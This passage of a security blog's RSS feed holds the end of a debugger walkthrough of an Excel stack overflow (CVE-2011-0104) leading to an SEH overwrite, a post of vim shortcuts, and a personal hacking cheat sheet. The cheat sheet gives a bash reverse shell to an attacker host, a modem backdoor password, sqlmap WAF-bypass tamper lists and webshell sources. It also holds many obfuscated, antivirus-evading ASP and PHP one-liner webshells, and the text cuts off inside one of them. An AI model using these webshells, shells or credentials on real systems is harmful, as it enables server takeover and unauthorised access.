    retn的关系易知,在一个函数帧中,当前ebp被处的内容被覆盖说明retn也被覆盖(一般不出现刚好覆盖到ebp,不覆盖
    的乃的情况)
    
f9
    中断发生在300de834处,如下:
    ----------------opperate_ebp-------------------
    300DE7EB   .  C3            retn
    300DE7EC   $  53            push ebx
    300DE7ED   .  8B5C24 0C     mov ebx,dword ptr ss:[esp+0xC]
    300DE7F1   .  85DB          test ebx,ebx
    300DE7F3   .  0F84 89970200 je EXCEL.30107F82
    300DE7F9   .  3B5C24 10     cmp ebx,dword ptr ss:[esp+0x10]                                               ;  EXCEL.3070DF42
    300DE7FD   .  0F87 03A71500 ja EXCEL.30238F06
    300DE803   .  8B15 442C8930 mov edx,dword ptr ds:[0x30892C44]
    300DE809   .  A1 402C8930   mov eax,dword ptr ds:[0x30892C40]
    300DE80E   .  55            push ebp
    300DE80F   .  8B6C24 0C     mov ebp,dword ptr ss:[esp+0xC]
    300DE813   .  56            push esi                                                                      ;  EXCEL.3088ECC0
    300DE814   .  57            push edi
    300DE815   &amp;gt;  3BD0          cmp edx,eax
    300DE817   .  0F8D F0B90300 jge EXCEL.3011A20D
    300DE81D   &amp;gt;  2BC2          sub eax,edx
    300DE81F   .  3BD8          cmp ebx,eax
    300DE821   .  7D 02         jge short EXCEL.300DE825
    300DE823   .  8BC3          mov eax,ebx
    300DE825   &amp;gt;  8DB2 40EC8830 lea esi,dword ptr ds:[edx+0x3088EC40]
    300DE82B   .  8BC8          mov ecx,eax
    300DE82D   .  8BD1          mov edx,ecx
    300DE82F   .  C1E9 02       shr ecx,0x2
    300DE832   .  8BFD          mov edi,ebp
    300DE834   .  F3:A5         rep movs dword ptr es:[edi],dword ptr ds:[esi]
    300DE836   .  8BCA          mov ecx,edx
    300DE838   .  83E1 03       and ecx,0x3
    300DE83B   .  F3:A4         rep movs byte ptr es:[edi],byte ptr ds:[esi]
    ---------------------end-----------------------
        
    300de834的入口在300de7ec,eip=300de834时,edi=12aa6f,esi=3088ecc0(内容为&quot;ABuJIKLK...&quot;),ebp=12aa0f,这样的话数
    据将被复制到edi(12aa6f)处,可是栈窗口中,edi(12aaf6)已经在ebp(12aa0f)的下面,如果数据从edi开始覆盖,是不会覆
    盖ebp的,这样应该不会引起retn被覆盖,既然不会覆盖当前函数帧的ebp,于是看看会不会覆盖上一函数帧的ebp

alt+k(查看调用堆栈)

    -----------alt+k------------
    调用堆栈:     主线程
    地址       堆栈       函数过程 / 参数                       调用来自                      结构
    001279C0   3070DF42   EXCEL.300DE7EC                        EXCEL.3070DF3D
    0012A9EC   30237FDF   ? EXCEL.3070DD5F                      EXCEL.30237FDA
    ------------end-------------

    上面结果表示,当前函数为300de7ec,上一帧函数为3070dd5f,为了查看上一函数帧的ebp,在alt+k窗口中右键单击
    3070dd5f,选择&quot;显示函数过程&quot;,然后在3070dd5f上下断点,重新运行od和excel,od中断到3070dd5f处

    中断发生,eip=3070dd5f,ebp=0012aa70(这个ebp与上面进入300e05ad函数的ebp相等,可见3070dd5f函数的上一函数帧为
    300e05ad,alt+k查看调用堆栈也可看出的确是这样)

f8
f8(此时ebp=00129aac,也即上面说的&quot;于是看看会不会覆盖上一函数帧的ebp&quot;中的ebp),129aac&amp;lt;12aa6f,所以也不会覆盖到
这个3070dd5f函数的ebp,3070dd5f的入口汇编指令如下:

    ----------------3070dd5f------------------
    3070DD5F  /$  55            push ebp
    3070DD60  |.  8DAC24 C4F0FF&amp;gt;lea ebp,dword ptr ss:[esp-0xF3C]
    3070DD67  |.  81EC EC0F0000 sub esp,0xFEC
    3070DD6D  |.  A1 00F08930   mov eax,dword ptr ds:[0x3089F000]
    3070DD72  |.  8365 58 00    and [arg.21],0x0
    ------------------end---------------------
    
    并不是一般情况下的push ebp,mov ebp,esp,所以这里不能直接在3070dd5f中断后f8+f8到eip=3070dd67处通过查看ebp中存
    放的内容(也即[ebp])来查看上一帧函数的ebp了,要查看上一帧的ebp,通过在函数刚刚进入执行完push ebp后直接查看
    [esp]便是上一帧的ebp内容了,所以这里总结出在当前函数帧查看上一帧函数的ebp的方法有如下两种:

        1&amp;gt;在当前函数帧中直接查看[ebp],这种方法对一般情况下适用,对当前函数帧的最开始两句汇编指令不是push ebp,mov
        ebp,esp的情况不适用

        2&amp;gt;在当前函数帧刚执行完第一句push ebp后,查看[esp]为多少,上一函数帧的ebp就是多少,要求第一句是push ebp,
        几乎大多函数都适用
    
    既然也不会覆盖到上一帧函数的ebp,看看会不会覆盖到上一帧的上一帧函数的ebp
    此时eip=3070dd67,用上面的第二种方法直接查看[esp]即可得出上一帧的上一帧的ebp为0012aa70,0012aa70&amp;gt;12aa6f,应该
    就是覆盖了这个ebp了,12aa70的下一栈单元12aa74中的值[12aa74]为30e05ad函数的返回地址,继续调试如下
    
在汇编窗口中ctrl+g:12aa70,右键下内存写入断点

    f9中断到300de834处:
    300DE834   .  F3:A5         rep movs dword ptr es:[edi],dword ptr ds:[esi]

在堆栈窗口中ctrl+g:12aa70,右键锁定堆栈

f7
f7
f7
...
f7
    在一直f7时会一直看到栈中的数据被改变,并慢慢接近12aa70,最终覆盖12aa70中的值,覆盖12aa74中的值,...

执行到返回
...
f8
f8
...
    最后执行到300e06f7处准备发生异常

        300E06F1   .  8B0D 445B8930 mov ecx,dword ptr ds:[0x30895B44]
        300E06F7   .  8908          mov dword ptr ds:[eax],ecx
        300E06F9   &amp;gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]                                               ;  EXCEL.30413050
        300E06FC   .  A3 445B8930   mov dword ptr ds:[0x30895B44],eax
        300E0701   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]
        300E0704   .  A3 34DF8830   mov dword ptr ds:[0x3088DF34],eax
        300E0709   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]
        300E070C   .  8D65 94       lea esp,dword ptr ss:[ebp-0x6C]
        300E070F   .  5F            pop edi                                                                       ;  0012CA48
        300E0710   .  5E            pop esi                                                                       ;  0012CA48
        300E0711   .  5B            pop ebx                                                                       ;  0012CA48
        300E0712   .  C9            leave
        300E0713   .  C2 2C00       retn 0x2C

    eip=300e06f7处发生异常是由windbg捕获的,此时查看seh链如下

        SEH 链用于  主线程
        地址       SE处理程序
        0012FD38   user32.77E3AF18
        0012FDA0   user32.77E3AF18
        0012FFB0   EXCEL.3087F58C
        0012FFE0   kernel32.7C821A78
在seh链窗口中右键全部&quot;在句柄上切换断点&quot;(也即全部下断),发现异常后会执行到77e3af18,但是不确定是12fd38处的
773af18还是12fda0处的77e3af18,于是先在12fd38上右键在堆栈窗口中跟随,转到如堆栈窗口数据:

    0012FD38  |0012FDA0  指向下一个 SEH 记录的指针
    0012FD3C  |77E3AF18  SE处理程序
    0012FD40  |77E2B890  user32.77E2B890
    0012FD44  |00000000

将0012fd3c处的77e3af18改成41414141,并从300e06f7处开始f8单步跟踪,发现这样程序会异常终止,猜测是由于其他线程
监视到41414141处并不能处理当前异常情况,如果将0012fd3c处的77e3af18改成300e0713(一个retn 0x2c指令的地址),异
常处理则无法进行,但程序不会终止,只是f8无法到下一步,一直停在300e06f7处,此时再将0012fd3c处的300e0713改回
77e3af18则会正常进入77e3af18,说明是第12fd38处的77e3af18为实际用到的异常处理程序,可见只要将恶意构造的数据覆
盖到0012fd38即可控制eip,从而执行shellcode.

由于实验中用的系统环境和《漏洞战争》中的环境一致,而书中用到的exploit.xlb是excel 2007 sp2的恶意数据,所以最
后不会执行到shellcode,只是异常.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 11 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/</guid>
        
        <category>漏洞分析</category>
        
        <category>漏洞战争</category>
        
        <category>excel</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>vim快捷键</title>
        <description>&lt;h3 id=&quot;x00-vim&quot;&gt;0x00 vim&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;函数折叠与打开
    zM函数全部折叠
    zR折叠全部打开
    zo打开一个折叠
    zc创建一个折叠
2&amp;gt;代码自动规范缩进
    ggvG
    =
    (python效果不好,有可能让代码不再对齐而出错)
3&amp;gt;easymotion插件(,为&amp;lt;leader&amp;gt;)默认&amp;lt;leader&amp;gt;&amp;lt;leader&amp;gt;w,添加如下映射:

    noremap ` H
    &quot;上面这句是因为H键原来应该是跳转到当前屏幕第一行，但是可能被其他插件冲突导致失效，noremap可以重新将数字1左边的键映射成原来H的效果
    map a ,,f
    map b ,,F
    map s `,,f
    &quot;上面四句实现3个键跳转到任意位置
    &quot;a为向下搜索，b为向上搜索，s为当前屏幕搜索,输入s/a/b+(想找的字符)+对应hint字符

4&amp;gt;vim写中文自动换行的处理
    https://wiki.archlinux.org/index.php/Vim_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#.E8.87.AA.E5.8A.A8.E6.8D.A2.E8.A1.8C.E6.98.BE.E7.A4.BA
    http://www.cnblogs.com/ayanmw/p/3432005.html
    http://blog.chinaunix.net/xmlrpc.php?r=blog/article&amp;amp;uid=53564&amp;amp;id=2098815
    http://blog.csdn.net/auwzb/article/details/11609363
    最后为实现写md文件可以在textwidth的值处自动换行,在vimrc中加入如下:
        autocmd FileType * setlocal textwidth=111 formatoptions=tcqmM
        (其中的textwidth=111为github pages的博客每行长度,且安装vim13后,上面的*只对md文件有效,如果写成FileType md setlocal...则没有效果,惑不解)


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-vimperator&quot;&gt;0x01 vimperator&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;3.14.0 (created: 2016/06/07 23:58:16)
imap jf &amp;lt;Esc&amp;gt;
imap fj &amp;lt;Esc&amp;gt;
cmap jf &amp;lt;Esc&amp;gt;
cmap fj &amp;lt;Esc&amp;gt;
&quot; noremap ; &amp;lt;S-;&amp;gt;无效
nmap mm ZZ
noremap J gT
noremap K gt
noremap h &amp;lt;S-Left&amp;gt;
noremap l &amp;lt;S-Right&amp;gt;
source! /root/.vimperatorrc.local

&quot; vim: set ft=vimperator:

set nextpattern=\s*下一页|下一张|下一篇|下页|后页\s*,^\bnext\b,\\bnext\\b,^&amp;gt;$,^(&amp;gt;&amp;amp; gt;|»)$,^(&amp;gt;|»),(&amp;gt;|»)$,\\bmore\\b
set previouspattern=\s*上一页|上一张|上一篇|上页|前页\s*,^\bprev|previous\b, \\bprev|previous\\b,^&amp;lt;$,^(&amp;lt;&amp;lt;|«)$,^(&amp;lt;|«),(&amp;lt;|«)$
nmap [ [[
nmap ] ]]

noremap bl :tabopen https://3xp10it.github.io &amp;lt;CR&amp;gt;
noremap gi :tabopen http://www.github.com/3xp10it &amp;lt;CR&amp;gt;
noremap li :tabopen https://3xp10it.github.io/bookmarks.html &amp;lt;CR&amp;gt;
noremap wo :tabopen http://192.168.3.13:1235/webinfos &amp;lt;CR&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 07 Aug 2016 00:00:00 +0800</pubDate>
        <link>/vim/2016/08/07/vim%E5%BF%AB%E6%8D%B7%E9%94%AE/</link>
        <guid isPermaLink="true">/vim/2016/08/07/vim%E5%BF%AB%E6%8D%B7%E9%94%AE/</guid>
        
        <category>linux</category>
        
        <category>editor</category>
        
        <category>effiency</category>
        
        
        <category>vim</category>
        
      </item>
    
      <item>
        <title>my notes</title>
        <description>&lt;p&gt;My updating note…&lt;/p&gt;

&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;1.&lt;/span&gt;没用过的在线扫描器:
    https://jawfish.io/
&lt;span class=&quot;p&quot;&gt;2.&lt;/span&gt;使用python开启一个简单的http服务:
    python - m SimpleHTTPServer 80
&lt;span class=&quot;p&quot;&gt;3.&lt;/span&gt;serve U运行cmd:
    quote site exec &quot;...&quot;
&lt;span class=&quot;p&quot;&gt;4.&lt;/span&gt;账号telecomadmin密码nE7jA%5m电信猫后门
&lt;span class=&quot;p&quot;&gt;5.&lt;/span&gt;linux local_root提权  http://exploit.linuxnote.org/
                        https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,unix-privesc-check)
                        https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
  windows　https://github.com/GDSSecurity/Windows-Exploit-Suggester
&lt;span class=&quot;p&quot;&gt;6.&lt;/span&gt;metasploit与postgresql数据库连接:msf &amp;gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
&lt;span class=&quot;p&quot;&gt;7.&lt;/span&gt;http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
&lt;span class=&quot;p&quot;&gt;8.&lt;/span&gt;bash反弹:
    /bin/bash -i &amp;gt; /dev/tcp/&lt;span class=&quot;nt&quot;&gt;&amp;lt;attacker&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_ip&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;port&amp;gt;&lt;/span&gt; 0&lt;span class=&quot;err&quot;&gt;&amp;lt;&amp;amp;&lt;/span&gt;1 2&amp;gt;&amp;amp;1
&lt;span class=&quot;p&quot;&gt;9.&lt;/span&gt;sed -i &#39;/Love/d&#39; 1.txt   删除包含Love的行
&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&amp;gt;&amp;gt;
    先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.
&lt;span class=&quot;p&quot;&gt;11.&lt;/span&gt;tar -T mulu.list -czf file.tar.gz
&lt;span class=&quot;p&quot;&gt;12.&lt;/span&gt;分割大文件再合并
    split -b 20m RevolutionOS.rmvb RevOS_part_,
    cat RevOS_part_&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;gt; RevolutionOS_RSB.rmvb,
    md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)
&lt;span class=&quot;p&quot;&gt;13.&lt;/span&gt;一些数据库操作
  给数据库添加一个用户
    CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;(可小写)
    修改密码
    SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);
    修改权限
    GRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39; WITH GRANT OPTION;(databasename.tablename可为&lt;span class=&quot;ge&quot;&gt;*.*&lt;/span&gt;,privileges可为all,注意databasename和tablename中不要有&#39;.&#39;这个标点,否则databasename.tablename不知道在哪儿算作分开,eg.gv32_cms5.1.9是数据库名,则会出错)
&lt;span class=&quot;p&quot;&gt;14.&lt;/span&gt;ip:23.23.23.23    (bing)
&lt;span class=&quot;p&quot;&gt;15.&lt;/span&gt;暴路径http://www.lxway.com/1191778.html  
&lt;span class=&quot;p&quot;&gt;16.&lt;/span&gt;sublime text快捷键好东西:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
  ctrl+D,ctrl+shift+k,ctrl+shift+&lt;span class=&quot;nt&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;,按住shift右键拖动鼠标多行编辑,set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,ctrl+shift+v完整粘贴源代码格式,移动一行ctrl+shift+上/下
&lt;span class=&quot;p&quot;&gt;17.&lt;/span&gt;nmap :
  nmap -v -sP -PI -PT -Pn 192.168.0.0/24
  nmap -v -sn -PE 192.168.0.0/24 快速扫描局域网存活主机
&lt;span class=&quot;p&quot;&gt;18.&lt;/span&gt;常用linux命令

   head -n 1 /etc/issue   # 查看linux操作系统版本
   getconf LONG_BIT       # 查看系统是32位还是64位
   网络
   
   # ifconfig               # 查看所有网络接口的属性
   # iptables -L            # 查看防火墙设置
   # route -n               # 查看路由表
   # netstat -lntp          # 查看所有  监听端口
   # netstat -antp          # 查看所有已经建立的连接
   # netstat -s             # 查看网络统计信息

   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*vimrc*&lt;/span&gt;&quot; | xargs grep -r &quot;linebreak&quot;
       #在当前目录下查找文件名中包含vimrc的所有文件,并在这些文件中查https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/找包含&quot;linebreak&quot;关键字的文件中的与&quot;linebreak&quot;相关的行
&lt;span class=&quot;p&quot;&gt;19.&lt;/span&gt;linux backup and restore:&lt;span class=&quot;nt&quot;&gt;&amp;lt;sudo&amp;gt;&lt;/span&gt;
    0&amp;gt;http://xing.rocks/2015/03/06/ubuntu%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/    更详细
    1&amp;gt;backup:
    cd /
    tar cvpzf linuxbackup.tgz --exclude=/proc --exclude=/lost+found --exclude=/linuxbackup.tgz --exclude=/mnt --exclude=/sys --exclude=/root/.cache /
    2&amp;gt;restore:
    backup the new system&#39;s /boot and /etc/fstab
    cd /
      tar xvpfz linuxbackup.tgz -C / 
      mkdir proc  
      mdkir lost+found  
      mkdir mnt   
      mkdir sys
    restore the new system&#39;s backup&#39;s /boot and /etc/fstab
      reboot
    3&amp;gt;http://blog.csdn.net/shendl/article/details/7384755
    4&amp;gt;https://wiki.archlinux.org/index.php/Full_system_backup_with_rsync
&lt;span class=&quot;p&quot;&gt;20.&lt;/span&gt;python中import和from xx import xx需要注意的事:
  import语句中:import或者from xx import xx语句当中,形如a.b的
  用法如from a.b import f(f是b.py中一个函数名或者一个常量,a是一个文件夹,只有文件夹才
  可以带.后接具体文件名《如此处的b&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;省略.py后缀&amp;gt;》,在具体的函数调用而不是import语句中,文件可
  以带.后接文件中的函数或常量《如sqlmap中,在sqlmap目录下运行python,可以import tamper.sapce2comment,然
  后运行tamper.space2comment.tamper(&quot; ajf  &quot;),但是不可以直接运行sapce2comment.tamper(&quot; ajf  &quot;),这样会报错,
  而且以上两种情况都需要在tamper文件夹下面放一个__init__.py文件,里面的内容可以
  为空,如果在sqlmap目录下使用from tamper import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;则需
  要在__init__.py里面加上__all__=&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&#39;&#39;,&#39;&#39;,&#39;&#39;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,其中&#39;&#39;里面
  是tamper目录下所有模块的模块名,这样的话就可以通过from tamper import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;来导入所有模块了,然后
  就可以使用如greatest.tamper(&quot;and 1&amp;gt;2&quot;)等的语句了》)
  各tamper详解:http://www.moonsec.com/post-422.html
  最常用--tamper=between,space2randomblank,randomcase,xforwardedfor,charencode
  大致通用between,space2randomblank,randomcase,xforwardedfor,charencode,multiplespaces,space2plus,nonrecursivereplacement,apostrophemask,base64encode,space2mssqlhash,space2mysqldash,unionalltounion,securesphere,space2comment
&lt;span class=&quot;p&quot;&gt;21.&lt;/span&gt;神器lfi自动探测panoptic:https://github.com/lightos/Panoptic
   神器load_file自动探测sqlnuke:https://github.com/nuke99/sqlnuke.git
&lt;span class=&quot;p&quot;&gt;22.&lt;/span&gt;webshell:
  webshell generate site(good):http://www.zjjv.com/
  good:https://r57.gen.tr/
       http://www.dcvi.net/
  http://www.passwaf.com/
  http://cduan.cc/ma/index.htm
  php-b374k(PHP version &amp;gt; 4.3.3 and PHP 5):https://github.com/b374k
         (browser old version): https://code.google.com/p/b374k-shell/
  http://www.dcvi.net/
&lt;span class=&quot;p&quot;&gt;23.&lt;/span&gt;经典入侵思路:
  http://www.2cto.com/Article/201201/115793.html(伪静态注入到获得webshell)
&lt;span class=&quot;p&quot;&gt;24.&lt;/span&gt;cookie注入中转http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(目前认为只可asp,get)
&lt;span class=&quot;p&quot;&gt;25.&lt;/span&gt;vpn搭建教程(2003server)http://www.xfisp.com/style/info/shownews.asp?id=3(pptp)
                         http://vps.gl/windows/215.html  http://help.fireinter.com/tengxunyun/2015/0203/354.html(l2tp)
&lt;span class=&quot;p&quot;&gt;26.&lt;/span&gt;关于ipcam的UPnP或NAT的知识http://www.pernet.tv/thread-103-1-1.html
&lt;span class=&quot;p&quot;&gt;27.&lt;/span&gt;google search api(good):http://www.catonmat.net/blog/python-library-for-google-search/ (not good now   xgoogle)
   google translate api(good):http://www.catonmat.net/blog/python-library-for-google-translate/   (not good now   xgoogle)
   (little good can search&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;inurl:index.php?option=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,but not(&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;site:*.edu inurl:inurl.php?option=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;)) https://pypi.python.org/pypi/Google-Search-API
   (guan_fang)google search api:http://scriptsonscripts.blogspot.com/2015/02/python-google-search-api-requests.html    ajax-&amp;gt;json-&amp;gt;guan_fang(custom search api,100 results per day for free user)
   (good_GoogleScraper,!-s (google,yahoo,bing..))google search api:http://incolumitas.com/2013/01/06/googlesearch-a-rapid-python-class-to-get-search-results/    or    https://github.com/NikolaiT/GoogleScraper/blob/master/README.md
   two links may mean (guan_fang)custom search api
   may helpful:https://google-api-client-libraries.appspot.com/documentation/customsearch/v1/python/latest/customsearch_v1.cse.html
   may helpful:https://github.com/google/google-api-python-client/tree/master/samples/customsearch
   may helpful:http://wescpy.blogspot.com/2014/09/simple-google-api-access-from-python.html   http://wescpy.blogspot.com/2014/11/authorized-google-api-access-from-python.html
   具体详情见百度云盘笔记文件夹
&lt;span class=&quot;p&quot;&gt;28.&lt;/span&gt;.NET reverse tool(graywolf):https://www.digitalbodyguard.com/graywolf.html
&lt;span class=&quot;p&quot;&gt;29.&lt;/span&gt;linux fdisk-&amp;gt;ext3-&amp;gt;mount:http://cuchadanfan.blog.51cto.com/9940284/1671416
&lt;span class=&quot;p&quot;&gt;30.&lt;/span&gt;Cknife  java环境菜刀  已放到/usr/share
&lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;免杀一句话:http://blog.hacku.cn/post/260.html
           http://www.freebuf.com/articles/web/9396.html
           kali linux2.0:
            webacoo
            weevely
   asp:
   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(unescape(&quot;eval%20request%28%222016%22%29&quot;))%&amp;gt;          key:2016

   &amp;lt;%
   dim a,b,temp,c
   a=&quot;eva@@l%20req@@uest%28%22helloxj%22%29&quot;
   b=replace(a,&quot;@@&quot;,&quot;零&quot;)
   c=split(b,&quot;零&quot;)
   for i=0 to ubound(c)
   temp=temp+c(i)
   next
   execute(unescape(temp))
   %&amp;gt;
                        key:helloxj

   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%Y=request(&quot;shezhang&quot;)%&amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(Y)%&amp;gt;
    
   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;shezhang&quot;))%&amp;gt;
    
   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval&quot;&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;(&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;v&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;a&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;l&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;r&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;q&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;u&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;s&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;t&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;0&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;2&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;5&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;)%&amp;gt;(密码是-7)

   php:
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?&amp;gt;&lt;/span&gt;       key:g
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?&amp;gt;&lt;/span&gt;        key:the value of &quot;a&quot;
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$a=str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;shezhang&quot;]);?&amp;gt;&lt;/span&gt;
    
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$lang=(string)key($_POST);$lang($_POST[&#39;shezhang&#39;]);?&amp;gt;&lt;/span&gt;
    
   test&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$k=&quot;ass&quot;.&quot;ert&quot;;$k(${&quot;_PO&quot;.&quot;ST&quot;}[&#39;nihao&#39;]);?&amp;gt;&lt;/span&gt;
    
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a=&quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_POST[&quot;shezhang&quot;]); ?&amp;gt;&lt;/span&gt;
    
   &amp;lt;?php         
   @$_=&quot;s&quot;.&quot;s&quot;./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;e&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/&quot;r&quot;;         
   @$_=/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;a&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/$_./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/&quot;t&quot;;         
   @$_/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/($/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/{&quot;_P&quot;./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;OS&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/&quot;T&quot;}         
